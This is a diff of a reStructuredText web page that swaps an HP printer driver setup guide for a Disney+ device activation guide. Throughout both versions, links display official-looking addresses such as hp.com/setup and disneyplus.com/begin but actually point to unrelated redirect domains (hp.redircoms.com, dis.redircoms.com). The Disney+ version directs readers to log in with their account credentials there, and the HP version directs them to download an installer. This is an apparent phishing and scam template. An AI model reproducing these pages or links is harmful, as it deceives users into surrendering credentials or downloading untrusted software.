@@ -1,73 +1,48 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+How to Activate Disney+ on My Device via disneyplus.com/begin
 ##################
 
 .. meta::
    :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
 
 .. image:: blank.png
-      :width: 350px
-      :align: center
-      :height: 100px
+   :width: 350px
+   :align: center
+   :height: 100px
 
 .. image:: Enter_Product_Key.png
-      :width: 350px
-      :align: center
-      :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+   :width: 350px
+   :align: center
+   :height: 100px
+   :alt: disneyplus.com/begin
+   :target: https://dis.redircoms.com
 
 .. image:: blank.png
-      :width: 350px
-      :align: center
-      :height: 100px
+   :width: 350px
+   :align: center
+   :height: 100px
 
-
-
-
-
-
-
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
 
 **********
-Steps to Download HP Printer Driver
+Steps to Activate Disney+ on Your Device
 **********
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
-
-2. Enter your HP printer model in the search box.
-
-3. Select your operating system if prompted.
-
-4. Click on **Download** to get the latest driver and software package.
-
-5. Save the installer file to your computer.
+1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
+2. On the welcome screen, an **8-digit activation code** will be displayed.
+3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
+4. Log in using your Disney+ account credentials.
+5. Enter the **8-digit code** shown on your TV/device screen.
+6. Click **Continue** and wait for the device to link successfully.
 
 **********
-Steps to Install HP Printer Driver
+What to Do After Activation
 **********
 
-1. Locate the downloaded installer file on your computer.
+1. Once activation is complete, your device will automatically refresh.
+2. You will now have full access to Disney+ content on your device.
+3. If the code expires, restart the app to generate a new code.
+4. For issues, ensure your device is connected to the internet and try again.
+5. You can repeat this process on additional devices using the same account.
 
-2. Double-click the installer to begin the setup process.
-
-3. Follow the on-screen instructions and accept the license agreement.
-
-4. Choose your connection type (USB or Wireless).
-
-5. Complete the installation by clicking **Finish**.
-
-**********
-Setting Up Your HP Printer
-**********
-
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
+Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
